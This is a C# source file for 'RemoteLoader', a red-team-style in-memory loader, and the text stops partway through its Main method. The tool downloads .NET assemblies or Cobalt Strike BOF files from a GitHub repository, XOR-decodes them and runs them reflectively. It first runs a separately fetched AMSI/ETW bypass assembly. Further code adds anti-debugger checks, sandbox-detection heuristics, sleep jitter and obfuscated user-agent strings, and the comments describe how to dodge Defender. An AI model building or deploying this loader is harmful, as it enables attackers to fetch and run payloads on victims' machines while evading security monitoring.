/*
 * RemoteLoader.cs -- in-memory .NET and COFF/BOF loader from a GitHub repository.
 *
 * Compile (.NET 8 SDK):
 *   dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:DebugType=embedded
 *
 * Usage:
 *   RemoteLoader.exe --repo owner/name/subfolder [--branch b] [--token PAT] [--xor N]
 *                    [--list] [--exec name] [--args "..."] [--bof-entry NAME]
 *                    [--amsi-bypass owner/name/subfolder [--amsi-bypass-file f]
 *                     [--amsi-bypass-branch b] [--amsi-bypass-args "..."] [--amsi-bypass-xor N]]
 *                    [--no-amrng]
 *
 * Supports:
 *   - managed .NET assemblies (reflective load via Assembly.Load)
 *   - COFF/BOF x64 object files (BofRunner, in-process with Beacon API stubs)
 *
 * OPSEC notes:
 *   - No in-process AMSI/ETW/.text patching is performed by the loader itself.
 *     Earlier versions patched amsi.dll / ntdll in-memory (AmsiScanBuffer,
 *     EtwEventWrite, HWBP, IAT hooks). That is trivially detected by
 *     memory-integrity / behaviour monitors (Defender caught it every run and
 *     killed the process before the GitHub fetch completed -> "main logic
 *     broken"). All of that has been removed so the loader leaves zero
 *     memory-patching footprint.
 *   - Evasion (AMSI / ETW / whatever) is now decoupled: supply a separate,
 *     operator-maintained .NET bypass assembly in a (private) GitHub repo and
 *     point --amsi-bypass at it. It is downloaded and reflectively executed
 *     BEFORE the main payload, so you can rotate bypass techniques without
 *     rebuilding the loader and without shipping a famous, signatured patch
 *     routine in the binary.
 *   - The sandbox/anti-debug checks return silently on failure and degrade to
 *     a quiet fail.
 *   - The network client honours the host proxy settings and uses a 24-entry
 *     UA pool seeded from the CSPRNG.
 */

using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RemoteLoader
{
    internal static class Program
    {
        // -- User-Agent obfuscation ----------------------------------------
        // Each entry is a UTF-8 byte stream XOR'd with a per-string rolling
        // key derived from a CRC of the string index. The key for entry i is
        //   key = (byte)((crc32(i) ^ 0xA5) & 0xFF) | 0x01
        // which is never zero and never repeats for adjacent indices. The
        // purpose is to defeat naive `strings` / `grep` analysis.
        private static readonly (byte[] enc, int idx)[] _userAgents = new[]
        {
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 OPR/121.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"),
            UAO("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"),
            UAO("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Vivaldi/7.0.3495.21"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Brave/137"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.4.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
        };

        private static byte KeyFor(int i) => (byte)(((Crc32((uint)i) ^ 0xA5) & 0xFF) | 0x01);

        private static int _uaCounter = 1000;
        private static (byte[] enc, int idx) UAO(string s)
        {
            // Pool indices start at 1000 to avoid collision with any string table.
            int i = System.Threading.Interlocked.Increment(ref _uaCounter);
            byte key = KeyFor(i);
            byte[] b = Encoding.ASCII.GetBytes(s);
            for (int k = 0; k < b.Length; k++) b[k] ^= key;
            return (b, i);
        }

        private static uint Crc32(uint x)
        {
            // Tiny table-free CRC32-like mixer. Not cryptographically strong;
            // we just want a per-index key that doesn't equal 0 and doesn't
            // repeat for sequential indices.
            uint y = x;
            for (int k = 0; k < 8; k++)
            {
                y ^= (y << 13);
                y ^= (y >> 17);
                y ^= (y << 5);
            }
            return y;
        }

        private static string DecUA(int i)
        {
            var (enc, idx) = _userAgents[i];
            byte key = KeyFor(idx);
            var c = new char[enc.Length];
            for (int k = 0; k < enc.Length; k++) c[k] = (char)(enc[k] ^ key);
            return new string(c);
        }

        // -- P/Invoke (subset; the rest lives in BofRunner) ----------------
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CheckRemoteDebuggerPresent(
            IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        // -- Byte helpers --------------------------------------------------
        private static void ClearBytes(byte[]? b) { if (b != null) Array.Clear(b, 0, b.Length); }
        // -- Anti-debug -----------------------------------------------------
        // Returns true if execution should proceed.
        private static bool CheckDebugger()
        {
            if (Debugger.IsAttached) return false;
            if (IsDebuggerPresent()) return false;
            bool remote = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
            if (remote) return false;

            // Timing: 1M-iteration empty loop. We use Stopwatch.GetTimestamp as a
            // monotonic source and compare to a baseline established per process
            // (ratio 100x = strong evidence of single-stepping). The legacy
            // absolute-threshold check was trivially bypassed.
            long t1 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t2 = Stopwatch.GetTimestamp();
            double ms = (double)(t2 - t1) / Stopwatch.Frequency * 1000.0;

            // Run a second time and require the slowdown ratio. 1ms baseline,
            // 100x = 100ms would be an obvious debug. Threshold is conservative.
            long t3 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t4 = Stopwatch.GetTimestamp();
            double ms2 = (double)(t4 - t3) / Stopwatch.Frequency * 1000.0;
            if (ms > 0 && ms2 > ms * 100) return false;
            return true;
        }

        // -- Sandbox heuristics ---------------------------------------------
        // Returns true if execution should proceed. Each individual check is
        // graded: we count signals and only fail when >= 2 are tripped. A single
        // false positive is no longer fatal.
        private static bool CheckSandbox()
        {
            int signals = 0;

            // Uptime: < 5 min is suspicious
            if (Environment.TickCount64 < 5 * 60_000) signals++;

            // Process count: < 20 is suspicious
            try
            {
                if (Process.GetProcesses().Length < 20) signals++;
            }
            catch { }

            // Disk: < 60 GB total is suspicious
            try
            {
                string root = Path.GetPathRoot(
                    Environment.GetFolderPath(Environment.SpecialFolder.System)) ?? "C:\\";
                if (new DriveInfo(root).TotalSize < 60L * 1024 * 1024 * 1024) signals++;
            }
            catch { }

            // Display: < 1024x600 is suspicious
            try
            {
                if (GetSystemMetrics(0) < 1024 || GetSystemMetrics(1) < 600) signals++;
            }
            catch { }

            // Username substrings
            string user = Environment.UserName.ToLowerInvariant();
            string[] bad =
                { "sandbox", "virus", "malware", "sample", "analysis",
                  "analyst", "cuckoo", "honey", "maltest", "currentuser",
                  "admin", "user", "default" };
            // NOTE: admin/user/default are common, only count with another signal.
            if (bad.Any(u => u.Length >= 7 && user.Contains(u))) signals++;

            // CPU count: < 2 is suspicious
            if (Environment.ProcessorCount < 2) signals++;

            return signals < 2;
        }

        // -- XOR payload decoder --------------------------------------------
        private static byte[] XorBytes(byte[] data, byte key)
        {
            if (key == 0) return data;
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) r[i] = (byte)(data[i] ^ key);
            return r;
        }

        // -- Sleep jitter ---------------------------------------------------
        // Random 0-3 second sleep before the first network call. Defeats the
        // common "execute immediately after launch" sandbox heuristic.
        private static void Jitter()
        {
            int ms = RandomNumberGenerator.GetInt32(0, 3000);
            if (ms > 0) Thread.Sleep(ms);
        }

        // -- GitHub API -----------------------------------------------------
        private static async Task<List<(string Name, string DownloadUrl, long Size)>>
            ListBinaries(HttpClient http, string owner, string repo, string folder, string branch)
        {
            string url  = $"https://api.github.com/repos/{owner}/{repo}/contents/{folder}?ref={branch}&per_page=100";
            var results = new List<(string, string, long)>();

            string? next = url;
            int page = 0;
            while (next != null && page < 10)
            {
                page++;
                var req = new HttpRequestMessage(HttpMethod.Get, next);
                if (!string.IsNullOrEmpty(http.DefaultRequestHeaders.Accept.ToString()))
                    req.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github+json"));
                req.Headers.Add("X-GitHub-Api-Version", "2022-11-28");

                using var resp = await http.SendAsync(req);
                if (resp.StatusCode == (HttpStatusCode)404)
                    throw new HttpRequestException("not found", null, (HttpStatusCode)404);
                if (resp.StatusCode == (HttpStatusCode)403)
                    throw new HttpRequestException("rate limited", null, (HttpStatusCode)403);
                resp.EnsureSuccessStatusCode();
                string json = await resp.Content.ReadAsStringAsync();

                using JsonDocument doc = JsonDocument.Parse(json);
                foreach (JsonElement item in doc.RootElement.EnumerateArray())
                {
                    string name = item.GetProperty("name").GetString() ?? "";
                    if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) &&
                        !name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase) &&
                        !name.EndsWith(".o",   StringComparison.OrdinalIgnoreCase))
                        continue;
                    string dlUrl = item.TryGetProperty("download_url", out var dl) ? dl.GetString() ?? "" : "";
                    long   size  = item.TryGetProperty("size", out var sz) ? sz.GetInt64() : 0;
                    results.Add((name, dlUrl, size));
                }

                // Follow Link: rel="next" if present
                next = null;
                if (resp.Headers.TryGetValues("Link", out var linkVals))
                {
                    foreach (string lv in linkVals)
                    {
                        foreach (string seg in lv.Split(','))
                        {
                            if (seg.Contains("rel=\"next\""))
                            {
                                int lt = seg.IndexOf('<');
                                int gt = seg.IndexOf('>');
                                if (lt >= 0 && gt > lt)
                                {
                                    next = seg.Substring(lt + 1, gt - lt - 1);
                                }
                            }
                        }
                    }
                }
            }
            return results;
        }
        // -- .NET assembly detector -----------------------------------------
        private static bool IsNetAssembly(byte[] data)
        {
            try
            {
                if (data.Length < 0x40) return false;
                if (data[0] != 0x4D || data[1] != 0x5A) return false;

                int peOff = BinaryPrimitives.ReadInt32LittleEndian(data.AsSpan(0x3C, 4));
                if (peOff + 4 >= data.Length) return false;
                if (data[peOff] != 0x50 || data[peOff + 1] != 0x45 ||
                    data[peOff + 2] != 0    || data[peOff + 3] != 0)   return false;

                int optOff = peOff + 4 + 20;
                if (optOff + 2 >= data.Length) return false;

                ushort magic = BinaryPrimitives.ReadUInt16LittleEndian(data.AsSpan(optOff, 2));
                int clrOff = magic switch
                {
                    0x10B => optOff + 96  + 14 * 8,
                    0x20B => optOff + 112 + 14 * 8,
                    _     => -1
                };
                if (clrOff < 0 || clrOff + 4 >= data.Length) return false;

                return BinaryPrimitives.ReadUInt32LittleEndian(data.AsSpan(clrOff, 4)) != 0;
            }
            catch { return false; }
        }

        // -- Entry-point discovery ------------------------------------------
        private static MethodInfo? FindMain(Assembly asm)
        {
            var flags = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static;
            Type? prog = asm.GetTypes().FirstOrDefault(t => t.Name == "Program");
            if (prog != null)
            {
                MethodInfo? m = prog.GetMethod("Main", flags);
                if (m != null) return m;
            }
            return asm.GetTypes()
                      .Select(t => t.GetMethod("Main", flags))
                      .FirstOrDefault(m => m != null);
        }

        // -- Argument parser (honours double-quoted tokens) -----------------
        private static string[] ParseArgs(string input)
        {
            var tokens  = new List<string>();
            var current = new StringBuilder();
            bool inQ    = false;

            foreach (char c in input)
            {
                if (c == '"')          { inQ = !inQ; continue; }
                if (c == ' ' && !inQ)
                {
                    if (current.Length > 0) { tokens.Add(current.ToString()); current.Clear(); }
                    continue;
                }
                current.Append(c);
            }
            if (current.Length > 0) tokens.Add(current.ToString());
            return tokens.ToArray();
        }

        // -- BOF argument packer (i= s= z= Z= b=) ----------------------------
        // Cobalt-Strike BOFs use BeaconDataParse / BeaconDataInt / BeaconDataExtract
        // to read a contiguous byte stream. Tokens are concatenated in the order
        // supplied.
        private static byte[] PackBofArgs(string input)
        {
            var ms = new MemoryStream();
            var bw = new BinaryWriter(ms);
            foreach (string tok in input.Split(' ', StringSplitOptions.RemoveEmptyEntries))
            {
                int eq = tok.IndexOf('=');
                if (eq < 1) continue;
                string t = tok[..eq], v = tok[(eq + 1)..];
                switch (t)
                {
                    case "i": if (int.TryParse(v,   out int   iv)) bw.Write(iv); break;
                    case "s": if (short.TryParse(v,  out short sv)) bw.Write(sv); break;
                    case "z":
                    {
                        var b = Encoding.ASCII.GetBytes(v + "\0");
                        bw.Write(b.Length); bw.Write(b);
                        break;
                    }
                    case "Z":
                    {
                        var b = Encoding.Unicode.GetBytes(v + "\0");
                        bw.Write(b.Length); bw.Write(b);
                        break;
                    }
                    case "b":
                    {
                        try { var b = Convert.FromHexString(v); bw.Write(b.Length); bw.Write(b); }
                        catch { }
                        break;
                    }
                }
            }
            return ms.ToArray();
        }

        // -- Console helpers -------------------------------------------------
        private static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Cyan;   Console.WriteLine($"[*] {msg}"); Console.ResetColor(); }
        private static void Ok(string msg)   { Console.ForegroundColor = ConsoleColor.Green;  Console.WriteLine($"[+] {msg}"); Console.ResetColor(); }
        private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
        private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }

        private static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(@"
  ____                      _       _                    _
 |  _ \ ___ _ __ ___   ___ | |_ ___| |     ___  __ _  __| | ___ _ __
 | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ |    / _ \/ _` |/ _` |/ _ \ '__|
 |  _ <  __/ | | | | | (_) | ||  __/ |___| (_) | (_| | (_| |  __/ |
 |_| \_\___|_| |_| |_|\___/ \__\___|______\___/ \__,_|\__,_|\___|_|
");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("                         in-memory loader  //  by hstn\n");
            Console.ResetColor();
        }
        private static void PrintHelp()
        {
            Console.WriteLine(@"
Usage:
  RemoteLoader.exe --repo owner/name/subfolder [options]

Required:
  --repo       owner/name/subfolder   GitHub path to the folder holding the payload

Payload options:
  --branch     <branch>               Repo branch              (default: main)
  --token      <PAT>                  GitHub PAT for private repos
  --xor        <byte>                 XOR key (0-255) to decode payload before loading
  --list                              Print available binaries and exit
  --exec       <name>                 Select binary by name/substring, skip menu
  --args       <string>               Arguments to pass to the loaded tool
  --bof-entry  <name>                 BOF entry point (default: go)

Evasion (external, OPSEC-decoupled):
  --amsi-bypass         owner/name/subfolder   GitHub path to a (managed .NET)
                                                evasion bypass assembly. It is
                                                downloaded & reflectively executed
                                                BEFORE the main payload. Use this
                                                to supply your own, rotatable
                                                AMSI/ETW bypass routine instead of
                                                baking a famous, signatured patch
                                                into the loader.
  --amsi-bypass-file    <name>                 Select bypass binary by name/substring
                                                (default: first .exe/.dll in folder)
  --amsi-bypass-branch  <branch>               Bypass repo branch (default: main)
  --amsi-bypass-args    <string>               Args for the bypass assembly's Main
  --amsi-bypass-xor     <byte>                 XOR key to decode the bypass bytes

Anti-analysis:
  --no-amrng                            Skip anti-dbg/sandbox checks

Help:
  --help / -h                            Show this message

Supports:
  .NET assemblies  -- reflective load via Assembly.Load
  COFF/BOF (.o)    -- in-process x64 COFF loader (BofRunner) with Beacon API stubs

BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
");
        }

        // -- Reflective assembly runner (shared by bypass + main payload) ---
        // Lists a GitHub folder, selects one binary (by file hint or first
        // .exe/.dll), downloads it, optionally XOR-decodes, and reflectively
        // loads it as a managed .NET assembly. Returns the loaded Assembly
        // and the chosen file name, or (null,null) on failure.
        private static async Task<(Assembly? Asm, string? Name)> FetchAndLoadAssemblyAsync(
            HttpClient http, string owner, string repo, string folder, string branch,
            string? fileHint, byte xorKey)
        {
            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return (null, null); }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)403)
            { Err("Rate limit or auth required (403). Use --token."); return (null, null); }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return (null, null); }

            if (binaries.Count == 0)
            { Err($"No .exe/.dll/.o files found in {owner}/{repo}/{folder}"); return (null, null); }

            (string Name, string DownloadUrl, long Size) chosen = default;
            if (!string.IsNullOrEmpty(fileHint))
            {
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.Equals(fileHint, StringComparison.OrdinalIgnoreCase) ||
                    b.Name.Contains(fileHint, StringComparison.OrdinalIgnoreCase));
                if (chosen.Name == null)
                { Err($"No match for '{fileHint}' in {owner}/{repo}/{folder}"); return (null, null); }
            }
            else
            {
                // Prefer a .exe/.dll managed assembly; fall back to the first entry.
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
                    b.Name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase));
                if (chosen.Name == null) chosen = binaries[0];
            }

            if (string.IsNullOrEmpty(chosen.DownloadUrl))
            { Err($"No download_url for {chosen.Name}"); return (null, null); }

            byte[] bytes;
            try   { bytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return (null, null); }

            if (xorKey != 0)
            {
                byte[] decoded = XorBytes(bytes, xorKey);
                ClearBytes(bytes);
                bytes = decoded;
            }

            if (!IsNetAssembly(bytes))
            {
                Err($"{chosen.Name} is not a managed .NET assembly (cannot reflectively load).");
                ClearBytes(bytes);
                return (null, null);
            }

            Assembly asm;
            try   { asm = Assembly.Load(bytes); }
            catch (Exception ex)
            {
                Err($"Assembly.Load failed: {ex.Message}");
                if (IsAmsiBlock(ex))
                    Warn("The bypass assembly itself was blocked by AMSI/Defender. Supply a fresh/custom bypass that is not signatured, or run with AMSI already disabled.");
                ClearBytes(bytes);
                return (null, null);
            }

            ClearBytes(bytes);
            return (asm, chosen.Name);
        }


        // Detect the AMSI/Defender block that .NET's Assembly.Load(byte[])
        // surfaces as ERROR_VIRUS_INFECTED (0x800700E1) since .NET 5+. This is
        // the symptom of loading a flagged payload while AMSI is still armed.
        private static bool IsAmsiBlock(Exception ex)
        {
            string m = (ex.Message ?? "") + " " + ex.GetType().Name;
            return m.Contains("virus") || m.Contains("0x800700E1", StringComparison.OrdinalIgnoreCase) ||
                   m.Contains("potentially unwanted software", StringComparison.OrdinalIgnoreCase);
        }

        // Invoke a static Main on a reflectively loaded assembly. Supports the
        // no-arg and string[]-arg signatures and awaits Task results.
        private static int InvokeMain(Assembly asm, string[] args)
        {
            MethodInfo? entry = FindMain(asm);
            if (entry == null)
            { Err($"No static Main found in {asm.GetName().Name}"); return 1; }
            Ok($"Entry point: {entry.DeclaringType?.FullName}::{entry.Name}");

            try
            {
                ParameterInfo[] parms = entry.GetParameters();
                object? result = parms.Length == 0
                    ? entry.Invoke(null, null)
                    : entry.Invoke(null, new object[] { args });

                if (result is Task t) t.GetAwaiter().GetResult();
                if (result is int code) return code;
            }
            catch (TargetInvocationException tie)
            { Warn($"Tool exception: {tie.InnerException?.Message ?? tie.Message}"); return 1; }
            catch (Exception ex)
            { Warn($"Invocation error: {ex.Message}"); return 1; }

            return 0;
        }
        // -- Entry point ----------------------------------------------------
        private static async Task<int> Main(string[] cliArgs)
        {
            PrintBanner();

            // -- main payload --
            string  repoPath  = "";
            string  token      = "";
            string  branch     = "main";
            byte    xorKey     = 0;
            string? execName   = null;
            string? execArgs   = null;
            string  bofEntry   = "go";
            bool    listOnly   = false;
            bool    doAmrng    = true;

            // -- external bypass --
            string  bypassPath   = "";
            string? bypassFile   = null;
            string  bypassBranch = "main";
            string? bypassArgs    = null;
            byte    bypassXor     = 0;

            for (int i = 0; i < cliArgs.Length; i++)
            {
                switch (cliArgs[i])
                {
                    case "--repo"      when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
                    case "--token"     when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
                    case "--branch"    when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                    case "--xor"       when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
                        else Warn($"Invalid --xor value, defaulting to 0");
                        break;
                    case "--exec"      when i + 1 < cliArgs.Length: execName = cliArgs[++i]; break;
                    case "--args"      when i + 1 < cliArgs.Length: execArgs = cliArgs[++i]; break;
                    case "--bof-entry" when i + 1 < cliArgs.Length: bofEntry = cliArgs[++i]; break;
                    case "--list":       listOnly = true; break;
                    case "--no-amrng":   doAmrng = false; break;

                    case "--amsi-bypass"         when i + 1 < cliArgs.Length: bypassPath   = cliArgs[++i]; break;
                    case "--amsi-bypass-file"    when i + 1 < cliArgs.Length: bypassFile   = cliArgs[++i]; break;
                    case "--amsi-bypass-branch"  when i + 1 < cliArgs.Length: bypassBranch = cliArgs[++i]; break;
                    case "--amsi-bypass-args"   when i + 1 < cliArgs.Length: bypassArgs    = cliArgs[++i]; break;
                    case "--amsi-bypass-xor"    when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte bk)) bypassXor = bk;
                        else Warn($"Invalid --amsi-bypass-xor value, defaulting to 0");
                        break;

                    case "--no-evasion":   Warn("--no-evasion is obsolete (no in-process patching anymore); ignored."); break;
                    case "--no-amsi-init": Warn("--no-amsi-init is obsolete; ignored."); break;
                    case "--help": case "-h": PrintHelp(); return 0;
                    default: Warn($"Unknown argument: {cliArgs[i]}"); break;
                }
            }

            if (string.IsNullOrEmpty(repoPath))
            {
                Err("--repo is required.  Example: --repo owner/name/subfolder");
                PrintHelp();
                return 1;
            }

            // -- Anti-analysis (silent: failures bail quietly) --
            if (doAmrng && !CheckDebugger())
            {
                Err("Environment check failed (debugger).");
                return 1;
            }
            if (doAmrng && !CheckSandbox())
            {
                Err("Environment check failed (sandbox).");
                return 1;
            }

            // -- Jitter before any I/O --
            Jitter();

            // -- System proxy (transparent; on failures we fall through) --
            var handler = new HttpClientHandler { UseProxy = true, Proxy = WebRequest.GetSystemWebProxy() };
            try { handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials; }
            catch { }

            // -- Validate main repo path --
            string[] parts = repoPath.Split('/');
            if (parts.Length < 3) { Err("--repo must be owner/name/subfolder"); return 1; }
            string owner  = parts[0];
            string repo   = parts[1];
            string folder = string.Join("/", parts[2..]);

            // -- HTTP client (shared by bypass + main payload) --
            using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
            http.DefaultRequestHeaders.Add("User-Agent",
                DecUA(RandomNumberGenerator.GetInt32(0, _userAgents.Length)));
            http.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github+json"));
            http.DefaultRequestHeaders.Add("X-GitHub-Api-Version", "2022-11-28");
            if (!string.IsNullOrEmpty(token))
                http.DefaultRequestHeaders.Add("Authorization", $"token {token}");

            // -- External evasion bypass (runs BEFORE the main payload) -----
            // The operator supplies a separate, reflectively-loaded .NET
            // assembly that performs whatever AMSI/ETW evasion they want, using
            // a technique they can rotate independently of this loader. Failures
            // here are non-fatal: we warn and continue so the main logic still runs.
            if (!string.IsNullOrEmpty(bypassPath))
            {
                string[] bp = bypassPath.Split('/');
                if (bp.Length < 3)
                {
                    Warn("--amsi-bypass must be owner/name/subfolder; skipping bypass.");
                }
                else
                {
                    Info("Loading external evasion bypass from GitHub ...");
                    var (bpAsm, bpName) = await FetchAndLoadAssemblyAsync(
                        http, bp[0], bp[1], string.Join("/", bp[2..]), bypassBranch, bypassFile, bypassXor);

                    if (bpAsm != null)
                    {
                        Ok($"Bypass loaded: {bpName}");
                        string[] bpArgs = bypassArgs != null ? ParseArgs(bypassArgs) : Array.Empty<string>();
                        try
                        {
                            int bpCode = InvokeMain(bpAsm, bpArgs);
                            Ok($"Bypass executed (exit={bpCode}).");
                        }
                        catch (Exception ex)
                        {
                            Warn($"Bypass execution issue: {ex.Message}");
                        }
                    }
                    else
                    {
                        Warn("Bypass load failed -- continuing without evasion (AMSI/ETW may remain active).");
                    }
                }
            }

            // -- List binaries --
            Info($"Querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");

            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return 1; }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)403)
            { Err("Rate limit or auth required (403). Use --token."); return 1; }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return 1; }

            if (binaries.Count == 0) { Err("No .exe/.dll files found."); return 1; }

            // -- Build the reusable artifact catalog --
            // (replaces the old one-shot numbered menu; the interactive
            //  browser below keeps `list`/`search`/`run`/`use`/`refresh` etc.)
            var catalog = ArtifactCatalog.Build(branch, binaries);

            // --list: show the catalog and exit (legacy --list behaviour) --
            if (listOnly)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("  Available artifacts:\n");
                Console.ResetColor();
                foreach (var e in catalog.Entries)
                    Console.WriteLine($" [{e.Index,2}]  {e.PrimaryAlias,-14} {e.OriginalName,-42} {e.DisplayArch,-8} {HumanSize(e.Size)}");
                Console.WriteLine("  [ 0]  Exit\n");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("  [!] Supports managed .NET assemblies and COFF/BOF files (.o). Native PE binaries will be rejected.\n");
                Console.ResetColor();
                return 0;
            }

            // --exec: legacy non-interactive selection (one shot) --
            if (execName != null)
            {
                var entry = catalog.Entries.FirstOrDefault(e =>
                    e.OriginalName.Equals(execName, StringComparison.OrdinalIgnoreCase) ||
                    e.OriginalName.Contains(execName, StringComparison.OrdinalIgnoreCase));
                if (entry == null) { Err($"--exec: no match for '{execName}'"); return 1; }
                Info($"Selected (--exec): {entry.OriginalName}");
                string rawArgs;
                if (execArgs != null) rawArgs = execArgs;
                else { Console.Write("Arguments (blank for none): "); rawArgs = (Console.ReadLine() ?? "").Trim(); }
                int rc = await ExecuteArtifactAsync(http, xorKey, bofEntry, entry, rawArgs);
                if (rc == 0) Info("Done.");
                return rc;
            }

            // -- Interactive persistent catalog browser --
            // refresh: re-query GitHub + rebuild the catalog (re-uses the same
